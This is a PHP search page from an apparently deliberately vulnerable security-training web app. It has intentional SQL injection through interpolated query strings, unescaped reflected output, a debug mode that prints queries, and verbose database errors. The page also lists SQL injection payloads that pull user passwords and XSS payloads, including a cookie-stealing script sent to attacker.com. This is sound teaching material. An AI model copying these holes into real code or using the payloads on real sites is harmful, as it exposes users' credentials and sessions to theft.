<?php
require_once 'config.php';

$results = [];
$error = '';
$search_term = '';

if (isset($_GET['q'])) {
    $search_term = $_GET['q'];
    $category = $_GET['category'] ?? '';
    
    $conn = getConnection();
    
    // VULNERABLE: SQL Injection via search parameter
    // Try: ' UNION SELECT id, username, password, email, role FROM users --
    // Try: ' OR 1=1 --
    if ($category) {
        $sql = "SELECT * FROM products WHERE name LIKE '%$search_term%' AND category = '$category'";
    } else {
        $sql = "SELECT * FROM products WHERE name LIKE '%$search_term%' OR description LIKE '%$search_term%'";
    }
    
    // Debug mode
    if (isset($_GET['debug'])) {
        echo "<pre style='background:#1a1f2e;color:#00ff88;padding:1rem;border-radius:8px;'>Query: $sql</pre>";
    }
    
    $result = $conn->query($sql);
    
    if ($result) {
        while ($row = $result->fetch_assoc()) {
            $results[] = $row;
        }
    } else {
        // Verbose error - SQL error disclosure
        $error = "Database error: " . $conn->error;
    }
    
    $conn->close();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Search - Security Testing Lab</title>
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
    <nav class="navbar">
        <div class="nav-container">
            <a href="index.php" class="logo">SecLab</a>
            <div class="nav-links">
                <a href="index.php" class="nav-link">Home</a>
                <a href="login.php" class="nav-link">Login</a>
                <a href="search.php" class="nav-link active">Search</a>
                <a href="products.php" class="nav-link">Products</a>
                <a href="profile.php" class="nav-link">Profile</a>
                <a href="comments.php" class="nav-link">Comments</a>
                <a href="upload.php" class="nav-link">Upload</a>
                <a href="admin.php" class="nav-link">Admin</a>
                <a href="api.php" class="nav-link">API</a>
                <a href="decoder.php" class="nav-link">Decoder</a>
            </div>
        </div>
    </nav>

    <div class="container">
        <div class="card">
            <div class="card-header">
                <div class="card-icon">🔍</div>
                <div>
                    <div class="card-title">Product Search</div>
                    <div class="card-subtitle">Search our product catalog</div>
                </div>
            </div>

            <form method="GET" action="search.php">
                <div class="grid grid-2">
                    <div class="form-group">
                        <label class="form-label">Search Term</label>
                        <input type="text" name="q" class="form-input" placeholder="Enter search term..." value="<?php echo htmlspecialchars($search_term); ?>">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Category</label>
                        <select name="category" class="form-select">
                            <option value="">All Categories</option>
                            <option value="electronics">Electronics</option>
                            <option value="books">Books</option>
                            <option value="accessories">Accessories</option>
                        </select>
                    </div>
                </div>
                <button type="submit" class="btn btn-primary">Search</button>
                <a href="search.php?q=<?php echo urlencode($search_term); ?>&debug=1" class="btn btn-secondary" style="margin-left: 0.5rem;">Debug Mode</a>
            </form>
        </div>

        <?php if ($error): ?>
            <div class="alert alert-error">❌ <?php echo $error; ?></div>
        <?php endif; ?>

        <?php if ($search_term): ?>
            <div class="card">
                <h3 style="margin-bottom: 1rem;">
                    <!-- VULNERABLE: Reflected XSS - search term not properly escaped -->
                    Search Results for: <?php echo $search_term; ?>
                </h3>

                <?php if (count($results) > 0): ?>
                    <div class="table-container">
                        <table>
                            <thead>
                                <tr>
                                    <th>ID</th>
                                    <th>Name</th>
                                    <th>Description</th>
                                    <th>Price</th>
                                    <th>Category</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php foreach ($results as $product): ?>
                                    <tr>
                                        <td><?php echo $product['id'] ?? ''; ?></td>
                                        <td><?php echo $product['name'] ?? $product['username'] ?? ''; ?></td>
                                        <td><?php echo $product['description'] ?? $product['password'] ?? ''; ?></td>
                                        <td><?php echo isset($product['price']) ? '$' . $product['price'] : ($product['email'] ?? ''); ?></td>
                                        <td><?php echo $product['category'] ?? $product['role'] ?? ''; ?></td>
                                    </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                <?php else: ?>
                    <p style="color: var(--text-muted);">No results found.</p>
                <?php endif; ?>
            </div>
        <?php endif; ?>

        <div class="grid grid-2">
            <div class="card">
                <div class="card-header">
                    <div class="card-icon">💉</div>
                    <div>
                        <div class="card-title">SQL Injection Testing</div>
                        <div class="card-subtitle">Try these payloads</div>
                    </div>
                </div>

                <h4 style="color: var(--accent-primary); margin-bottom: 1rem;">Union-Based SQLi</h4>
                <div class="code-block">
' UNION SELECT 1,2,3,4,5 --
' UNION SELECT id,username,password,email,role FROM users --
' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables --
                </div>

                <h4 style="color: var(--accent-primary); margin: 1.5rem 0 1rem;">Error-Based SQLi</h4>
                <div class="code-block">
' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users)) --
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1))) --
                </div>

                <h4 style="color: var(--accent-primary); margin: 1.5rem 0 1rem;">Boolean-Based SQLi</h4>
                <div class="code-block">
' AND 1=1 --
' AND 1=2 --
' AND (SELECT COUNT(*) FROM users) > 0 --
                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <div class="card-icon">📝</div>
                    <div>
                        <div class="card-title">XSS Testing</div>
                        <div class="card-subtitle">Reflected XSS payloads</div>
                    </div>
                </div>

                <h4 style="color: var(--accent-primary); margin-bottom: 1rem;">Basic XSS</h4>
                <div class="code-block">
&lt;script&gt;alert('XSS')&lt;/script&gt;
&lt;img src=x onerror=alert('XSS')&gt;
&lt;svg onload=alert('XSS')&gt;
                </div>

                <h4 style="color: var(--accent-primary); margin: 1.5rem 0 1rem;">Cookie Stealing</h4>
                <div class="code-block">
&lt;script&gt;document.location='http://attacker.com/?c='+document.cookie&lt;/script&gt;
                </div>

                <h4 style="color: var(--accent-primary); margin: 1.5rem 0 1rem;">DOM Manipulation</h4>
                <div class="code-block">
&lt;script&gt;document.body.innerHTML='&lt;h1&gt;Hacked&lt;/h1&gt;'&lt;/script&gt;
                </div>

                <div class="alert alert-info" style="margin-top: 1.5rem;">
                    💡 <strong>Note:</strong> The search term is reflected without proper sanitization
                </div>
            </div>
        </div>
    </div>
</body>
</html>

